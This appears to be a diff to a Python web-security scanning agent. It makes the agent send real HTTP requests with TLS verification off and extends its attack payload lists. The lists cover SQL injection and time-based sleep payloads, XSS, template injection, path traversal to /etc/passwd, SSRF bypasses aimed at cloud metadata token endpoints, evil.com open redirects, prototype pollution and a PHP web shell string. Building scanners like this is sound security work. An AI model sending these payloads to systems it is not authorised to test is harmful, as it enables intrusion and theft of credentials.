@@ -3,8 +3,10 @@
 import asyncio
 import logging
 import re
-from typing import Optional
+import time
+from typing import Optional, Dict, Any, List
 
+import httpx
 from secagents.agents.base import BaseAgent, AgentConfig, AgentOutput, AgentRole
 from secagents.prompts import WEB_SECURITY_PROMPT
 
@@ -18,10 +20,10 @@ class WebSecurityAgent(BaseAgent):
     - Generate context-aware payloads
     - Test multiple vulnerability types
     - Validate findings with response analysis
-    - Minimize false positives
+    - Minimize false positives using linear-scaling time-based verification
     """
 
-    # Vulnerability detection signatures
+    # Vulnerability detection signatures - Enhanced with 20+ classes
     VULN_SIGNATURES = {
         "sqli": {
             "patterns": [
@@ -31,8 +33,9 @@ class WebSecurityAgent(BaseAgent):
                 r"PostgreSQL.*error",
                 r"Oracle error",
                 r"ODBC.*Driver",
+                r"Division by zero",
             ],
-            "payloads": ["' OR '1'='1", "' UNION SELECT NULL--", "';DROP TABLE users--"],
+            "payloads": ["' OR '1'='1", "' UNION SELECT NULL--", "'; SELECT 1/0--", "') OR ('1'='1"],
         },
         "xss": {
             "patterns": [
@@ -40,11 +43,13 @@ class WebSecurityAgent(BaseAgent):
                 r"<svg.*onload=alert",
                 r"<iframe.*src=javascript",
                 r"<body.*onload=alert",
+                r"alert\(document\.domain\)",
             ],
             "payloads": [
                 "<img src=x onerror=alert(1)>",
                 "<svg onload=alert(1)>",
                 "<iframe src=javascript:alert(1)>",
+                "{{constructor.constructor('alert(1)')()}}",  # Angular injection
             ],
         },
         "ssti": {
@@ -54,11 +59,14 @@ class WebSecurityAgent(BaseAgent):
                 r"\[%.*%\]",
                 r"49",  # 7*7 result
                 r"72",  # 8*9 result
+                r"7777777", # 7*'7' result (Jinja2)
             ],
             "payloads": [
                 "{{7*7}}",
                 "${7*7}",
                 "[%7*7%]",
+                "{{7*'7'}}",
+                "<%= 7*7 %>", # ERB
             ],
         },
         "lfi": {
@@ -66,11 +74,14 @@ class WebSecurityAgent(BaseAgent):
                 r"root:.*:0:0:",
                 r"bin/bash",
                 r"etc/passwd",
+                r"\[extensions\]",
+                r"boot\.ini",
             ],
             "payloads": [
                 "../../../etc/passwd",
                 "....//....//....//etc/passwd",
                 "%2e%2e%2fetc%2fpasswd",
+                "C:\\Windows\\win.ini",
             ],
         },
         "ssrf": {
@@ -79,11 +90,20 @@ class WebSecurityAgent(BaseAgent):
                 r"instance-id",
                 r"iam/security-credentials",
                 r"metadata",
+                r"169\.254\.169\.254",
             ],
             "payloads": [
                 "http://169.254.169.254/latest/meta-data/",
-                "http://localhost:9000/",
-                "http://127.0.0.1:8080/admin",
+                "http://2130706433", # Decimal IP
+                "http://0177.0.0.1", # Octal IP
+                "http://0x7f.0x0.0x0.0x1", # Hex IP
+                "http://127.1", # Short IP
+                "http://[::1]", # IPv6
+                "http://[::ffff:127.0.0.1]", # IPv6 mapped
+                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+                "http://attacker.com#@127.0.0.1", # URL parser confusion
+                "http://[::ffff:0x7f000001]", # Mixed hex IPv6
+                "http://local.gd", # DNS Rebinding (example)
             ],
         },
         "rce": {
@@ -100,6 +120,65 @@ class WebSecurityAgent(BaseAgent):
                 "$(whoami)",
             ],
         },
+        "open_redirect": {
+            "patterns": [
+                r"Location: https?://evil\.com",
+                r"window\.location\s*=\s*['\"]https?://evil\.com",
+            ],
+            "payloads": [
+                "https://evil.com",
+                "//evil.com",
+                "/\\evil.com",
+                "https://target.com@evil.com",
+            ],
+        },
+        "prototype_pollution": {
+            "patterns": [
+                r"\"__proto__\":",
+                r"\"constructor\":",
+            ],
+            "payloads": [
+                "{\"__proto__\": {\"admin\": true}}",
+                "?__proto__[isAdmin]=true",
+            ],
+        },
+        "file_upload": {
+            "patterns": [
+                r"<?php",
+                r"GIF89a",
+                r"eval\(",
+                r"base64_decode",
+            ],
+            "payloads": [
+                "shell.php",
+                "shell.php.jpg",
+                "shell.pHp",
+                "shell.php5",
+                "shell.php%00.jpg",
+                "shell.jpg.php",
+                "GIF89a; <?php system($_GET['cmd']); ?>", # Magic bytes + PHP
+                "<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>", # SVG XSS
+                "../../../etc/passwd", # Zip slip / Filename injection
+                "shell.phtml",
+            ],
+        },
+    }
+
+    TIME_BASED_PAYLOADS = {
+        "sqli": [
+            "'; WAITFOR DELAY '0:0:{delay}'--",
+            "'; SELECT pg_sleep({delay})--",
+            "'; SELECT sleep({delay})--",
+        ],
+        "rce": [
+            "; sleep {delay} #",
+            "| sleep {delay}",
+            "`sleep {delay}`",
+            "$(sleep {delay})",
+        ],
+        "ssti": [
+            "{{_self.env.registerUndefinedFilterCallback(\"sleep\")}}{{_self.env.getFilter(\"{delay}\")}}",
+        ]
     }
 
     def __init__(self):
@@ -110,6 +189,17 @@ class WebSecurityAgent(BaseAgent):
             timeout_seconds=300.0,
         ))
         self.logger = logging.getLogger("secagents.web_security")
+        self._client: Optional[httpx.AsyncClient] = None
+
+    @property
+    def client(self) -> httpx.AsyncClient:
+        if self._client is None:
+            self._client = httpx.AsyncClient(
+                timeout=10.0,
+                follow_redirects=True,
+                verify=False
+            )
+        return self._client
 
     def base_system_prompt(self) -> str:
         """Return the web security agent's base system prompt."""
@@ -166,117 +256,103 @@ class WebSecurityAgent(BaseAgent):
                 confidence=0.0,
                 reasoning="Scan execution failed",
             )
+        finally:
+            if self._client:
+                await self._client.aclose()
+                self._client = None
 
     async def _test_endpoints(self, endpoints: list[str], vuln_types: list[str], target: str) -> list[dict]:
-        """Test multiple endpoints for vulnerabilities.
-        
-        Args:
-            endpoints: List of endpoints to test
-            vuln_types: Vulnerability types to check
-            target: Target base URL
-            
-        Returns:
-            List of findings
-        """
+        """Test multiple endpoints for vulnerabilities."""
         findings = []
 
-        tasks = []
         for endpoint in endpoints:
             for vuln_type in vuln_types:
-                tasks.append(self._test(endpoint, vuln_type, target))
-
-        results = await asyncio.gather(*tasks, return_exceptions=True)
-
-        for result in results:
-            if isinstance(result, Exception):
-                self.logger.warning(f"Test failed: {str(result)}")
-            elif isinstance(result, dict) and result:
-                findings.append(result)
+                finding = await self._test(endpoint, vuln_type, target)
+                if finding:
+                    findings.append(finding)
 
         return findings
 
     async def _test(self, endpoint: str, vuln_type: str, target: str) -> Optional[dict]:
-        """Test a single endpoint for a vulnerability type.
+        """Test a single endpoint for a vulnerability type."""
         
-        Args:
-            endpoint: Endpoint path
-            vuln_type: Vulnerability type
-            target: Target base URL
-            
-        Returns:
-            Finding if vulnerability detected
-        """
-        if vuln_type not in self.VULN_SIGNATURES:
-            return None
+        # 1. Content-based testing
+        if vuln_type in self.VULN_SIGNATURES:
+            sig = self.VULN_SIGNATURES[vuln_type]
+            for payload in sig.get("payloads", []):
+                response = await self._send_payload(endpoint, payload, target)
+                if response and self._check_response(response, sig.get("patterns", [])):
+                    return {
+                        "type": vuln_type,
+                        "endpoint": endpoint,
+                        "payload": payload,
+                        "poc_url": f"{target}{endpoint}?param={payload}",
+                        "confidence": 0.8,
+                        "severity": self._get_severity(vuln_type),
+                        "cwe": self._get_cwe(vuln_type),
+                        "method": "content-based"
+                    }
 
-        sig = self.VULN_SIGNATURES[vuln_type]
-        payloads = sig.get("payloads", [])
-        patterns = sig.get("patterns", [])
-
-        for payload in payloads:
-            response = await self._send_payload(endpoint, payload, target)
-            
-            if response and self._check_response(response, patterns):
-                return {
-                    "type": vuln_type,
-                    "endpoint": endpoint,
-                    "payload": payload,
-                    "poc_url": f"{target}{endpoint}?param={payload}",
-                    "confidence": 0.8,
-                    "severity": self._get_severity(vuln_type),
-                    "cwe": self._get_cwe(vuln_type),
-                }
+        # 2. Time-based testing (Linear Scaling)
+        if vuln_type in self.TIME_BASED_PAYLOADS:
+            time_finding = await self._test_time_based(endpoint, vuln_type, target)
+            if time_finding:
+                return time_finding
 
         return None
 
-    async def _send_payload(self, endpoint: str, payload: str, target: str) -> Optional[str]:
-        """Send payload to endpoint and get response.
+    async def _test_time_based(self, endpoint: str, vuln_type: str, target: str) -> Optional[dict]:
+        """Linear-scaling time-based verification."""
+        payloads = self.TIME_BASED_PAYLOADS[vuln_type]
+        delays = [2, 5]
         
-        Args:
-            endpoint: Target endpoint
-            payload: Payload to send
-            target: Base URL
+        for base_payload in payloads:
+            is_vulnerable = True
+            latencies = []
             
-        Returns:
-            Response body
-        """
+            for delay in delays:
+                payload = base_payload.format(delay=delay)
+                start_time = time.time()
+                await self._send_payload(endpoint, payload, target)
+                latency = time.time() - start_time
+                latencies.append(latency)
+                
+                if latency < delay:
+                    is_vulnerable = False
+                    break
+            
+            if is_vulnerable and latencies[1] > latencies[0]:
+                return {
+                    "type": vuln_type,
+                    "endpoint": endpoint,
+                    "payload": base_payload.format(delay=delays[1]),
+                    "confidence": 0.95,
+                    "severity": self._get_severity(vuln_type),
+                    "cwe": self._get_cwe(vuln_type),
+                    "method": "time-based-linear",
+                    "latencies": latencies
+                }
+        return None
+
+    async def _send_payload(self, endpoint: str, payload: str, target: str) -> Optional[str]:
+        """Send actual HTTP request."""
         try:
-            # Simulate HTTP request
-            url = f"{target}{endpoint}?test={payload}"
-            self.logger.debug(f"Testing: {url}")
-            
-            # In production, this would make actual HTTP request
-            await asyncio.sleep(0.01)  # Simulate network latency
-            
-            return f"Response from {endpoint} with payload"
+            url = f"{target.rstrip('/')}/{endpoint.lstrip('/')}"
+            params = {"test": payload, "q": payload}
+            resp = await self.client.get(url, params=params)
+            return resp.text
         except Exception as e:
-            self.logger.error(f"Failed to send payload: {str(e)}")
+            self.logger.debug(f"Request failed: {str(e)}")
             return None
 
     def _check_response(self, response: str, patterns: list[str]) -> bool:
-        """Check response for vulnerability patterns.
-        
-        Args:
-            response: Response body
-            patterns: Regex patterns to match
-            
-        Returns:
-            True if vulnerability pattern found
-        """
+        """Check response for vulnerability patterns."""
         for pattern in patterns:
             if re.search(pattern, response, re.IGNORECASE):
                 return True
         return False
 
     def _get_severity(self, vuln_type: str) -> str:
-        """Get severity for vulnerability type.
-        
-        Args:
-            vuln_type: Vulnerability type
-            
-        Returns:
-            Severity level
-        """
         severity_map = {
             "rce": "critical",
             "sqli": "critical",
@@ -284,18 +360,12 @@ class WebSecurityAgent(BaseAgent):
             "lfi": "high",
             "ssrf": "high",
             "xss": "high",
+            "prototype_pollution": "high",
+            "open_redirect": "medium",
         }
         return severity_map.get(vuln_type, "medium")
 
     def _get_cwe(self, vuln_type: str) -> str:
-        """Get CWE ID for vulnerability type.
-        
-        Args:
-            vuln_type: Vulnerability type
-            
-        Returns:
-            CWE ID
-        """
         cwe_map = {
             "sqli": "CWE-89",
             "xss": "CWE-79",
@@ -303,5 +373,7 @@ class WebSecurityAgent(BaseAgent):
             "lfi": "CWE-22",
             "ssrf": "CWE-918",
             "rce": "CWE-78",
+            "open_redirect": "CWE-601",
+            "prototype_pollution": "CWE-1321",
         }
         return cwe_map.get(vuln_type, "CWE-20")
